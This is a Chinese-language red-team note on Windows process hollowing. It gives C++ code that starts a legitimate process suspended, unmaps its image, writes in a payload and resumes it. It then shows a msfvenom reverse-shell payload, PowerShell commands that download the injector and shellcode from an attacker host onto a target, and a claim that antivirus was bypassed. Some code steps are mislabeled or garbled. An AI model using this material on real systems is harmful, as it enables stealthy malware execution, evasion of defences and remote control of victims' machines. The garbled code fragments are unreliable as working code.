	https://www.autosectools.com/Process-Hollowing.pdf
	https://github.com/reevesrs24/EvasiveProcessHollowing
	第 1 步：创建一个处于挂起状态的新进程：
	设置了CREATE_SUSPENDED标志的CreateProcessA()
```c++
printf("Creating process\r\n");
LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
CreateProcessA
(
                0,
                pDestCmdLine,
                0,
                0,
                0,
                CREATE_SUSPENDED,
                0,
                0,
                pStartupInfo,
                pProcessInfo
);
 
if (!pProcessInfo->hProcess)
{
                printf("Error creating process\r\n");
                return;
}
```
	第 2 步：交换其内存内容（取消映射/挖空）：
	NtUnmapViewOfSection()
	可以使用以下方法完成：
	NtQueryProcessInformation + ReadProcessMemory
	此外，可以使用单个函数轻松完成：
	ReadRemotePEB(pProcessInfo->hProcess) PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
	从 PEB 的图像地址读取 NT Headers 格式（从 PE 结构）。这是必不可少的，因为它包含与操作系统相关的信息，这些信息在进一步的代码中需要。这可以使用    ReadRemoteImage() 来完成。pImage 是指向 hProcess 句柄和 ImageBaseAddress 的指针。
```c++
PLOADED_IMAGE pImage = ReadRemoteImage
(
pProcessInfo- > hProcess,
pPEB- > ImageBaseAddress
);
```
	第 3 步：在此未映射区域中输入恶意负载：
	VirtualAllocEx :分配新内存
	WriteProcessMemory()：写入每个恶意软件部分以针对进程空间
```c++
printf("Unmapping destination section\r\n");
HMODULE hNTDLL = GetModuleHandleA("ntdll");                                                                                                                                  
FARPROC fpNtUnmapViewOfSection = GetProcAddress  
(
            hNTDLL,                                                                                             
            "NtUnmapViewOfSection"                                      
);
 
_NtUnmapViewOfSection NtUnmapViewOfSection =
(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;   
 
DWORD dwResult = NtUnmapViewOfSection
(
            pProcessInfo->hProcess,
            pPEB->ImageBaseAddress
);
```
	第 4 步：将 EAX 设置为入口点：
	设置线程上下文（）
```c++
for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
{
            if (!pSourceImage->Sections[x].PointerToRawData)
                        continue;
            PVOID pSectionDestination =          (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);
}
```
		第 5 步：启动挂起的线程：
		恢复线程（）
```c++
for (DWORD y = 0; y < dwEntryCount; y++)
{
            dwOffset += sizeof(BASE_RELOCATION_ENTRY);
            if (pBlocks[y].Type == 0)
                        continue;
            DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
            DWORD dwBuffer = 0;
            ReadProcessMemory
            (
                        pProcessInfo->hProcess,
                        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
                        &dwBuffer,
                        sizeof(DWORD),
                        0
            );
            dwBuffer += dwDelta;
            BOOL bSuccess = WriteProcessMemory
            (
                        pProcessInfo->hProcess,
                        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
                        &dwBuffer,
                        sizeof(DWORD),
                        0
            );
}
```
	第 6 步：将 EAX 设置为入口点并恢复线程
```c++
LPCONTEXT pContext = new CONTEXT () ; 
pContext- > ContextFlags = CONTEXT_INTEGER;
GetThreadContext ( pProcessInfo- > hThread, pContext )
DWORD dwEntrypoint = ( DWORD ) pPEB- > ImageBaseAddress + pSourceHeaders- > OptionalHeader。AddressOfEntryPoint ;
pContext- > Eax = dwEntrypoint;                              //EAX设置为入口点
SetThreadContext ( pProcessInfo- > hThread, pContext )
ResumeThread ( pProcessInfo- > hThread ) //线程恢复   
```
	第 7 步：用自定义代码替换正版进程
```c++
pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
strcat(pPath, "helloworld.exe");
CreateHollowedProcess("svchost",pPath);
```
	在 PoC 的第 1 部分中，编写了一个 Process Hollowing exe，其中包含一个小的 PoC 代码弹出窗口，该弹出窗口被注入到一个合法的 explorer.exe 进程中。这是一个独立的 EXE，因此，硬编码的弹出可以替换为 msfvenom shellcode，为您自己的 C2 服务器提供反向 shell。
	签入进程资源管理器后，我们看到一个新的 explorer.exe 进程已创建，其指定的进程 ID 相同，表明我们的 EXE 已使用空心技术成功伪装。

![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/red/3.png)

	https://github.com/3xpl01tc0d3r/ProcessInjection
	该工具将原始 shellcode 作为文本文件的输入，并注入用户指定的合法进程。可以使用 Visual Studio 下载和编译发布（转到 Visual Studio->打开 .sln 文件->构建发布）
	$ msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=192.168.0.89 LPORT=1234 -f hex

![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/red/4.png)
  
	传到目标机器执行
	$ powershell wget 192.168.0.89/ProcessInjection.exe -O ProcessInjection.exe
	$ powershell wget 192.168.0.89/hex.txt -O hex.txt
	$ ProcessInjection.exe /t:3 /f:hex /path:"hex.txt" /ppath:"c:\windows\system32\notepad.exe"

![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/red/5.png)

	收到shell
  
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/red/6.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/red/7.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/red/8.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/red/9.png)

	在进程资源管理器中，我们看到生成了一个新的 notepad.exe，其 PID 与创建新进程的 PID 相同，并且绕过了AV
